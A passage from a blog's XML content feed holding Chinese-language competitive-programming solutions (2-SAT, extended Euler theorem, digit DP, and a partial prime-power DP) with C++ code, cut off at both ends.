m));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P5782」和平委员会 - 2-SAT</title>
    <url>/luogu-5782/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P5782">洛谷链接</a></p>
<p>根据宪法，Byteland
民主共和国的公众和平委员会应该在国会中通过立法程序来创立。
不幸的是，由于某些党派代表之间的不和睦而使得这件事存在障碍。
此委员会必须满足下列条件：</p>
<ul>
<li>每个党派都在委员会中恰有 <span class="math inline">\(1\)</span>
个代表。</li>
<li>如果 <span class="math inline">\(2\)</span>
个代表彼此厌恶，则他们不能都属于委员会。</li>
</ul>
<p>每个党在议会中有 <span class="math inline">\(2\)</span>
个代表。代表从 <span class="math inline">\(1\)</span> 编号到 <span
class="math inline">\(2n\)</span>。 编号为 <span
class="math inline">\(2i-1\)</span> 和 <span
class="math inline">\(2i\)</span> 的代表属于第 <span
class="math inline">\(i\)</span> 个党派。</p>
<p>任务：写一程序读入党派的数量和关系不友好的代表对，计算决定建立和平委员会是否可能，若行，则列出委员会的成员表。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据，<span
class="math inline">\(1 \leq n \leq 8000\)</span>，<span
class="math inline">\(0 \leq m \leq 20000\)</span>，<span
class="math inline">\(1 \leq a &lt; b \leq 8000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这是一道 2-SAT 问题。</p>
<p>如果 <span class="math inline">\(a\)</span> 与 <span
class="math inline">\(b\)</span> 互相厌恶，那么只能 <span
class="math inline">\(a\)</span> 出现时 <span class="math inline">\(b
\oplus 1\)</span> 必定出现，或 <span class="math inline">\(b\)</span>
出现时 <span class="math inline">\(a \oplus 1\)</span> 必定出现。连接
<span class="math inline">\(a \rightarrow (b \oplus 1)\)</span> 和 <span
class="math inline">\(b \rightarrow (a \oplus 1)\)</span>
这两条边，然后跑一遍 2-SAT 就得出答案了。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">80000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> dfn, low;</span><br><span class="line">    <span class="type">bool</span> v;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Connected</span> *connected;</span><br><span class="line">&#125; N[<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Connected</span> &#123;</span><br><span class="line">    <span class="type">int</span> size, id;</span><br><span class="line">&#125; connecteds[<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tarjan</span><span class="params">(Node *x)</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> num = <span class="number">0</span>, counts = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> std::stack&lt;Node *&gt; stk;</span><br><span class="line">    x-&gt;dfn = x-&gt;low = ++num;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">    x-&gt;v = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;x-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;x-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!e-&gt;t-&gt;dfn) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(e-&gt;t);</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, e-&gt;t-&gt;low);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e-&gt;t-&gt;v) &#123;</span><br><span class="line">            x-&gt;low = std::<span class="built_in">min</span>(x-&gt;low, e-&gt;t-&gt;dfn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x-&gt;dfn == x-&gt;low) &#123;</span><br><span class="line">        counts++;</span><br><span class="line">        connecteds[counts].id = counts;</span><br><span class="line">        Node *y;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            y = stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">            y-&gt;v = <span class="literal">false</span>;</span><br><span class="line">            y-&gt;connected = &amp;connecteds[counts];</span><br><span class="line">            connecteds[counts].size++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (x != y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">addEdge</span>(a, b % <span class="number">2</span> ? b + <span class="number">1</span> : b - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">addEdge</span>(b, a % <span class="number">2</span> ? a + <span class="number">1</span> : a - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!N[i].dfn) &#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(&amp;N[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * n; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (N[i].connected == N[i + <span class="number">1</span>].connected) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NIE&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * n; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, N[i].connected-&gt;id &lt; N[i + <span class="number">1</span>].connected-&gt;id ? i : i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>POI</tag>
        <tag>2001</tag>
        <tag>Tarjan</tag>
        <tag>2-SAT</tag>
        <tag>强连通分量</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 17D」Notepad - 数论</title>
    <url>/cf-17d/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/17/D">Codeforces
链接</a></p>
<p>你有一个本子，你要往上面写全部的长度为 <span
class="math inline">\(n\)</span> 的 <span
class="math inline">\(b\)</span> 进制数字，每一页可以写 <span
class="math inline">\(c\)</span> 个。要求所有数字必须严格不含前导 <span
class="math inline">\(0\)</span>。求最后一页上有多少个数字</p>
<p>数据范围：<span class="math inline">\(2 \leq b &lt; 10^{10^6}, 1 \leq
n &lt; 10^{10^6}, 1 \leq c \leq 10^9\)</span></p>
<span id="more"></span>
<h1 id="题意描述-1">题意描述</h1>
<p>翻译一下题意，本题即为求出下列式子的值：</p>
<p><span class="math display">\[
(b - 1)b^{n - 1} \bmod c
\]</span></p>
<p><span class="math inline">\(b\)</span> 可以对 <span
class="math inline">\(c\)</span>
取模处理掉。而按照本题的数据范围直接进行快速幂显然是不可行的。于是我们可以对式子进行一些变换。</p>
<p>由拓展欧拉定理，我们可以得到下列同余方程：</p>
<p><span class="math display">\[
(b - 1)b^{n - 1} \equiv
\begin{cases}
(b - 1)(b)^{n - 1} \pmod c &amp; n - 1 &lt; \varphi(c) \\
(b - 1)(b)^{(n - 1) \bmod \varphi(c) + \varphi(c)} \pmod c &amp; n - 1
\geq \varphi(c)
\end{cases}
\]</span></p>
<p>当 <span class="math inline">\(n\)</span> 过大时，我们可直接将其对
<span class="math inline">\(\varphi(c)\)</span>
取模再进行快速幂计算即可。</p>
<p>这道题我们可以先读入 <span
class="math inline">\(c\)</span>，然后再读入 <span
class="math inline">\(b\)</span>，边读边取模。如果 <span
class="math inline">\(n\)</span> 在 <span
class="math inline">\(9\)</span>
位及以内可以直接读并进行快速幂，否则就先算出 <span
class="math inline">\(\varphi(c)\)</span>，然后边读 <span
class="math inline">\(c\)</span> 边取模。最后计算出结果即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">read</span><span class="params">(<span class="type">const</span> std::string &amp;s, <span class="type">long</span> <span class="type">long</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = s.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        ans = ans * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ans %= p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">phi</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">2</span>; i * i &lt;= a; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a % i == <span class="number">0</span>) &#123;</span><br><span class="line">            ans = ans / i * (i - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span> (a % i == <span class="number">0</span>) a /= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; <span class="number">1</span>) ans = ans / a * (a - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">pow</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">long</span> <span class="type">long</span> k, <span class="type">long</span> <span class="type">long</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (; k; k &gt;&gt;= <span class="number">1</span>, a = a * a % p) <span class="keyword">if</span> (k &amp; <span class="number">1</span>) ans = ans * a % p;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    std::cout.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    std::string bIn, nIn;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> c;</span><br><span class="line">    std::cin &gt;&gt; bIn &gt;&gt; nIn &gt;&gt; c;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> b = <span class="built_in">read</span>(bIn, c), n = <span class="built_in">read</span>(nIn, <span class="number">1e9</span>), p = <span class="built_in">phi</span>(c);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> k;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; p || nIn.<span class="built_in">length</span>() &gt; <span class="number">9</span>) k = (<span class="built_in">read</span>(nIn, p) - <span class="number">1</span> + p) % p + p;</span><br><span class="line">    <span class="keyword">else</span> k = n - <span class="number">1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = (b - <span class="number">1</span> + c) % c * <span class="built_in">pow</span>(b, k, c) % c;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; (ans ? ans : c) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>Codeforces</tag>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P6218」Round Numbers - 数位 DP</title>
    <url>/luogu-6218/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P6218">洛谷链接</a></p>
<p>如果一个正整数的二进制表示中，<span class="math inline">\(0\)</span>
的数目不小于 <span class="math inline">\(1\)</span>
的数目，那么它就被称为「圆数」。</p>
<p>例如，<span class="math inline">\(9\)</span> 的二进制表示为 <span
class="math inline">\(1001\)</span>，其中有 <span
class="math inline">\(2\)</span> 个 <span
class="math inline">\(0\)</span> 与 <span
class="math inline">\(2\)</span> 个 <span
class="math inline">\(1\)</span>。因此，<span
class="math inline">\(9\)</span> 是一个「圆数」。</p>
<p>请你计算，区间 <span class="math inline">\([l,r]\)</span>
中有多少个「圆数」。</p>
<p>数据范围：<span class="math inline">\(1\le l,r\le 2\times
10^9\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题显然数位 DP。我们设 <span class="math inline">\(a_n\)</span>
为小于等于 <span class="math inline">\(n\)</span>
中的圆数的个数，则答案为 <span class="math inline">\(a_r - a_{l -
1}\)</span>。其中 <span class="math inline">\(a_n\)</span> 可用数位 DP
解决。</p>
<p>对于 <span class="math inline">\(a_i\)</span>，我们首先将 <span
class="math inline">\(n\)</span> 使用二进制表示。设 <span
class="math inline">\(n\)</span> 有 <span
class="math inline">\(\text{len}\)</span> 位，于是圆数至少要有 <span
class="math inline">\(\text{need} = \lfloor \frac{\text{len} + 1}{2}
\rfloor\)</span> 个 <span class="math inline">\(0\)</span>。设 <span
class="math inline">\(f_{i, \text{last}, \text{num}}\)</span> 为剩下
<span class="math inline">\(i\)</span> 位时，前 <span
class="math inline">\(\text{len} - \text{i} - 1\)</span> 位有 <span
class="math inline">\(\text{last}\)</span> 个 <span
class="math inline">\(0\)</span>，第 <span
class="math inline">\(\text{len} - \text{i}\)</span> 位为 <span
class="math inline">\(\text{num}\)</span>，且小于剩余 <span
class="math inline">\(i\)</span> 位均为 <span
class="math inline">\(0\)</span>
的数时的圆数个数。显然我们可得到下列状态转移方程：</p>
<p><span class="math display">\[
f_{i, \text{last}, \text{num}} =
\begin{cases}
\begin{align}
&amp; \sum_{j = 1}^{\text{len - 1}}\sum_{k = \lfloor \frac{i + 1}{2}
\rfloor}^{j - 1}{j - 1 \choose k} &amp; i = \text{len} - 1 \wedge
\text{num} = 1 \\
&amp; \sum_{j = \text{need} - \text{last} - 1}^{i}{i \choose j} &amp; i
\ne \text{len} - 1 \wedge \text{num} = 1 \\
&amp; 0 &amp; \text{num} = 0
\end{align}
\end{cases}
\]</span></p>
<ul>
<li>公式 <span class="math inline">\((1)\)</span> 表示遍历第 <span
class="math inline">\(1\)</span> 位的情况，由于这种情况不可含前导 <span
class="math inline">\(0\)</span> 所以要特殊处理；</li>
<li>公式 <span class="math inline">\((2)\)</span>
表示遍历到后面位数时该位为 <span class="math inline">\(1\)</span>
的情况，此时 <span class="math inline">\(f_{i, \text{last},
\text{num}}\)</span> 则计算当小于当前数的情况，即该位为 <span
class="math inline">\(0\)</span>、后面位数任意时圆数的个数；</li>
<li>公式 <span class="math inline">\((3)\)</span>
表示遍历到后面位数时该位为 <span class="math inline">\(0\)</span>
的情况，由于不存在比 <span class="math inline">\(0\)</span>
小的自然数，故 <span class="math inline">\(f_{i, \text{last},
\text{num}} = 0\)</span>。</li>
</ul>
<p>设 <span class="math inline">\(n\)</span> 的前 <span
class="math inline">\(\text{len} - \text{i}\)</span> 位的 <span
class="math inline">\(0\)</span> 的个数为 <span
class="math inline">\(\text{last}_i\)</span>、第 <span
class="math inline">\(\text{len} - \text{i}\)</span> 位为 <span
class="math inline">\(\text{num}_i\)</span>。于是我们可以预处理组合数，计算出答案
<span class="math inline">\(a_n = (\sum_{i = 1}^{\text{len}}\sum_{j =
0}^{\text{num}_i}{f_{i, \text{last}_i, j}}) + [n \in
\text{圆数}]\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> C[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">prepare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>) C[i][j] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> C[i][j] = C[i - <span class="number">1</span>][j] + C[i- <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">    <span class="keyword">for</span> (; n; n &gt;&gt;= <span class="number">1</span>) nums.<span class="built_in">push_back</span>(n &amp; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> len = nums.<span class="built_in">size</span>(), need = (len + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">int</span> x = nums[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == len - <span class="number">1</span>) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = (j + <span class="number">1</span>) / <span class="number">2</span>; k &lt;= j - <span class="number">1</span>; k++) &#123;</span><br><span class="line">                        res += C[j - <span class="number">1</span>][k];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = need - last - <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                    res += C[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> last++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; last &gt;= need) res++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">prepare</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">solve</span>(r) - <span class="built_in">solve</span>(l - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>数位 DP</tag>
        <tag>数学</tag>
        <tag>组合数学</tag>
        <tag>洛谷</tag>
        <tag>USACO</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P6280」Exercise - DP + 数论</title>
    <url>/luogu-6280/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P6280">洛谷链接</a></p>
<p>Farmer John（又）想到了一个新的奶牛晨练方案！<br />
如同之前，Farmer John 的 <span class="math inline">\(N\)</span>
头奶牛站成一排。对于 <span class="math inline">\(1\le i\le N\)</span>
的每一个 <span class="math inline">\(i\)</span>，从左往右第 <span
class="math inline">\(i\)</span> 头奶牛的编号为 <span
class="math inline">\(i\)</span>。他告诉她们重复以下步骤，直到奶牛们与她们开始时的顺序相同。</p>
<p>给定长为 <span class="math inline">\(N (1 \le N \le 10^4)\)</span>
的一个排列 <span
class="math inline">\(A\)</span>，奶牛们改变她们的顺序，使得在改变之前从左往右第
<span class="math inline">\(i\)</span> 头奶牛在改变之后为从左往右第
<span class="math inline">\(A_i\)</span> 头。<br />
例如，如果 <span
class="math inline">\(A=(1,2,3,4,5)\)</span>，那么奶牛们总共进行一步。如果
<span
class="math inline">\(A=(2,3,1,5,4)\)</span>，那么奶牛们总共进行六步。每步之后奶牛们从左往右的顺序如下：</p>
<p>0 步：<span class="math inline">\((1,2,3,4,5)\)</span><br />
1 步：<span class="math inline">\((3,1,2,5,4)\)</span><br />
2 步：<span class="math inline">\((2,3,1,4,5)\)</span><br />
3 步：<span class="math inline">\((1,2,3,5,4)\)</span><br />
4 步：<span class="math inline">\((3,1,2,4,5)\)</span><br />
5 步：<span class="math inline">\((2,3,1,5,4)\)</span><br />
6 步：<span class="math inline">\((1,2,3,4,5)\)</span><br />
<strong>求所有正整数 <span class="math inline">\(K\)</span>
的和，使得存在一个长为 <span class="math inline">\(N\)</span>
的排列，奶牛们需要进行恰好 <span class="math inline">\(K\)</span>
步。</strong></p>
<p>由于这个数字可能非常大，输出答案模 <span
class="math inline">\(M\)</span> 的余数（<span
class="math inline">\(10^8\le M\le 10^9+7\)</span>，<span
class="math inline">\(M\)</span> 是质数）。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>我们可以画图理解以下，对于一个序列 <span
class="math inline">\(a_n\)</span>，连有向边 <span
class="math inline">\(i \rightarrow a_i\)</span>。若奶牛需要走 <span
class="math inline">\(k\)</span>
步，则这张图必定成多个环，且所有环的长度的最小公倍数为 <span
class="math inline">\(k\)</span>。</p>
<p>由于与最小公倍数有关，我们可以通过分解质因数解决。于是我们可以先把小于等于
<span class="math inline">\(n\)</span> 的质数。接下来我们就可以使用 DP
计数。</p>
<p>我么设 <span class="math inline">\(f_{i, j}\)</span>
表示分解质因数后因数只在前 <span class="math inline">\(i\)</span>
个质数出现，且点的总数为 <span class="math inline">\(j\)</span>
的情况下，<span class="math inline">\(k\)</span>
的总和。于是我们可以推出下列方程（设 <span
class="math inline">\(p_i\)</span> 为第 <span
class="math inline">\(i\)</span> 个质数，总共有 <span
class="math inline">\(\text{cnt}\)</span> 个质数）：</p>
<p><span class="math display">\[
f_{i, j} = f_{i - 1, j} + \sum_{p \in \mathbb{N}^* \wedge p_i^t \le
j}{(f_{i - 1, j - p_i^t} \times p_i^t)}
\]</span></p>
<p>如果有剩余的点，我们可以将剩余的点自环解决，这样可不影响最小公倍数。于是我们可以得出答案：<span
class="math inline">\(\sum_{i = 0}^n{f_{\text{cnt},
i}}\)</span>，加上取模即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> isNotPrime[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> primes[MAXN + <span class="number">1</span>], cnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">euler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    isNotPrime[<span class="number">0</span>] = isNotPrime[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isNotPrime[i]) primes[++cnt] = i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= cnt; j++) &#123;</span><br><span class="line">            <span class="type">int</span> t = i * primes[j];</span><br><span class="line">            <span class="keyword">if</span> (t &gt; MAXN) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            isNotPrime[t] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">euler</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cnt &gt; <span class="number">0</span> &amp;&amp; primes[cnt] &gt; n) cnt--;</span><br><span class="line"></span><br><span class="line">    std::vector&lt;std::vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">f</span>(cnt + <span class="number">1</span>, std::<span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(n + <span class="number">1</span>));</span><br><span class="line">  